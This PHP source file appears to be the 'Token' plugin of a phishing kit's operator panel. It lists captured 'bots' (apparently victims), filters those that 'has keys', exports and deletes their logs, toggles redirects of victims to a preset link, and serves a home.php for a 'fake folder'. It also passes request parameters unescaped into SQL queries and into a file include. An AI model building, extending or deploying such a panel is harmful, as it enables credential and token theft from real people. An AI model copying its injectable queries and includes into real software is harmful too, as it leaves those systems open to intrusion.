<?php

/*
Plugin name:Token;
 */



if (!defined('UADMIN_AB_ROOT')) {die("You not have permisions");}

?>
<link href="<?php echo $k_plugin->url_ ?>css/css.css" rel="stylesheet">
<script src="bower_components/angular/angular.min.js" type="text/javascript">
</script>

<?php

$res = $sql->
    query("select * from sys");
$res    = $res->fetchArray();
$reg    = $res['reg'];
$re_all = $res['re_all'];
// $jab    = json_decode($res['jab']);

//###### real id convert################
//real id is rela id of the visito , can be botid, rundom folder or what ever, we ned to conver tot sqlite ui;

if (isset($_GET['real_ui'])) {
    $ui = esc__($_GET['real_ui']);

    $res        = $sql->query("select rowid from main where ui='$ui' limit 1 ")->fetchArray();
    $ui         = $res[0];
    $_GET['ui'] = $ui; //
}
;

//#############################


if (isset($_GET['ui'])) {

    $ui = $_GET['ui'];
    $res=$sql->query("select * from main where rowid='$ui' limit 1")->fetchArray();
    $link=$res['link'];



    if (isset($_GET['sub']) && file_exists(__dir__."/sub/".$_GET['sub'] . ".php")) {

        


        include __dir__."/sub/".$_GET['sub'] . ".php";
        exit__();
    }
    include 'op_panel.php';
    exit__();

}


    ?>
<div class="container-fluid my-3 " ng-app="app" ng-cloak=>
    
    

    <div class="alert-danger alert">
        To avoid errors and panel freeze, empty unwanted logs regularly. There is button to remove empty logs that not have any data. Those  logs need to be removed all the time. Keep panel small and it will be fast
    </div>
   
    <div class="" global_swiches="" style="">
        <table class="table table-striped table-bordered">
            <tr>
                <td>
                   <b>Redirect all</b> is ...  <span class="fa fa-question-circle-o float-right" title="Redirect all" data-toggle="popover" data-content="If it set to ON than all EXISTING and NEW bots wil be redirect to preset link on each page" ></span>
                </td>
                <td>
                    <b>Registration</b> is ... <span class="fa fa-question-circle-o float-right" title="Registration" data-toggle="popover" data-content="If it set to OFF than all NEW bots will be redirected to preset link as soon as they load page. All existing bots will be functional as normal !" ></span>
                </td>
                <td>
                    Show only if ...
                </td>
                <td class="">
                    Tools
                </td>
            </tr>
            <tr>
                <td>
                    <a class="st_toggle" ng-click="toggle_global_re(0)" ng-show="sys.re_all==1">
                        <span class="fa fa-toggle-on">
                        </span>
                        ON
                    </a>
                    <a class="st_toggle" ng-click="toggle_global_re(1)" ng-show="sys.re_all==0">
                        <span class="fa fa-toggle-off">
                        </span>
                        OFF
                    </a>
                </td>
                <td>
                    <a class="st_toggle" ng-click="toggle_global_reg(0)" ng-show="sys.reg==1">
                        <span class="fa fa-toggle-on">
                        </span>
                        ON
                    </a>
                    <a class="st_toggle" ng-click="toggle_global_reg(1)" ng-show="sys.reg==0">
                        <span class="fa fa-toggle-off">
                        </span>
                        OFF
                    </a>
                </td>
                <td>
                    <div class="btn-group btn-group-sm pull-left" role="group">
                        <button class="btn btn-outline-danger" onclick="resetall_filters()" type="button">
                            Reset
                        </button>
                        <button class="btn btn-outline-info filterbuttons" onclick="$(this).toggleClass('active');$(this).find('.fa').toggle();togle_online_search()" type="button">
                            <span class="fa fa-check-square-o filtertoglers" style="display: none;">
                            </span>
                            ... online
                        </button>
                        <button class="btn btn-outline-info filterbuttons " onclick="$(this).toggleClass('active');$(this).find('.fa').toggle();togle_with_pass_search()" type="button">
                            <span class="fa fa-check-square-o filtertoglers" style="display: none;">
                            </span>
                            ... has keys
                        </button>
                        <div class="btn-group btn-group-sm linkdropdown" linkfilter="" role="group">
                            <button aria-expanded="false" aria-haspopup="true" class="btn btn-outline-info dropdown-toggle" data-toggle="dropdown" type="button">
                                ... page ID is
                                
                            </button>
                            <div class="dropdown-menu">
                                
                                    <a ng-repeat="link in php_js.links" class="dropdown-item" href="javascript:void(0)" ng-click="ch_link_arr(link, !link.show)" >
                                        <span class="fa fa-check-square-o linktoglge" ng-show="link.show" style="">
                                        </span>
                                        <span class="fa fa-square-o linktoglge" ng-show="!link.show" style="">
                                        </span>
                                        {{link.link}}
                                    </a>
                                
                            </div>
                        </div>
                    </div>
                </td>
                <td class="">
                    <div class="btn-group btn-group-sm">
                        <button class="btn btn-outline-info dropdown-toggle " data-toggle="dropdown">
                            Export ...
                        </button>
                        <div class="dropdown-menu">
                            <a href="javascript:void(0)" class="dropdown-item" onclick="pre_selected(export_)">
                                ... selected
                            </a>
                            <a href="javascript:void(0)" class="dropdown-item  disabled"  onclick="export_not_empty()" >
                                ... not empty
                            </a>
                            <a href="javascript:void(0)" class="dropdown-item  disabled"   onclick="export_all()">
                                ... all
                            </a>
                        </div>
                    </div>
                    <div class="btn-group btn-group-sm">
                        <div class="btn btn-outline-danger dropdown-toggle" data-toggle="dropdown">
                            Delete ...
                        </div>
                        <div class="dropdown-menu">
                            <a href="javascript:void(0)" class="dropdown-item " onclick="del_()" >
                                ... selected
                            </a>
                            <a href="javascript:void(0)" class="dropdown-item "  onclick="remove_empty()">
                                ... empty
                            </a>
                            <a href="javascript:void(0)" class="dropdown-item "  onclick="remove_all()" >
                                ... all
                            </a>
                        </div>
                    </div>

                    <a class="btn btn-outline-info btn-sm " data-toggle="popover" title="home.php" data-content="home.php file - file to replace inside in fake folder. Just a simple way to assign path to uPanel" href="<?php echo $k_plugin->ajax_url ?>&proxy">  home.php  <span class="fa fa-download"></span></a>
                </td>
            </tr>
        </table>
    </div>
    <hr>
    <table cellspacing="0" class="table table-striped table-bordered" id="token_table" width="100%">
    </table>
    </hr>
</div>
<script src="bower_components/ua-parser-js/dist/ua-parser.min.js" type="text/javascript"></script>
<script src="bower_components/moment/min/moment.min.js" type="text/javascript"></script>
<script src="<?php echo $k_plugin->url_ ?>js1/js.js?v=<?php echo uniqid() ?>" type="text/javascript"></script>
<script src="<?php echo $k_plugin->url_ ?>js1/dataTable.js?v=<?php echo uniqid() ?>" type="text/javascript"></script>
<script src="<?php echo $k_plugin->url_ ?>js1/js.ng.js?v=<?php echo uniqid() ?>" type="text/javascript"></script>